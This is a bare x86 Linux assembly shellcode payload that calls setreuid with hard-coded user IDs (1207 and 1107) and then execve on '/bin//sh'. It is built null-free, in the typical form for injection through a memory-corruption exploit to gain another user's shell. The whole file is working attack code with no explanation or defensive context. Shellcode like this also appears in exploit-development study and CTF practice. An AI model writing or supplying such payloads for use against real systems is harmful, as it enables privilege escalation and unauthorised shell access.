section .text

global _start

_start:
	push   0x46
	pop    eax
	xor    ebx, ebx
	mov    ebx, 0x4b7
	mov    ecx, 0x453
	int    0x80

	xor    edx, edx
	push   0xb
	pop    eax
	push   edx
	push   0x68732f2f
	push   0x6e69622f
	mov    ebx, esp
	push   edx
	push   ebx
	mov    ecx, esp
	int    0x80
